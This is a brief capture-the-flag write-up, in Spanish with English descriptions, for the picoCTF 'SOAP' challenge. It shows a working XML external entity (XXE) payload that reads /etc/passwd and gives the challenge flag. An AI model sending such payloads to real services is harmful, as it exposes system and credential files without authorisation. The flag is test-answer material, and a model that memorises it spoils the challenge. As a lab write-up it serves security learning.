## SOAP
## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

## Solución

basicamente se trata de recibir y cambiar la solucion de entrada ademas de su XML para poder insertar un xxe y sacar la contraseña
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
   <ID>&xxe;</ID>
</data>
```

picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
## Notas
## Referencias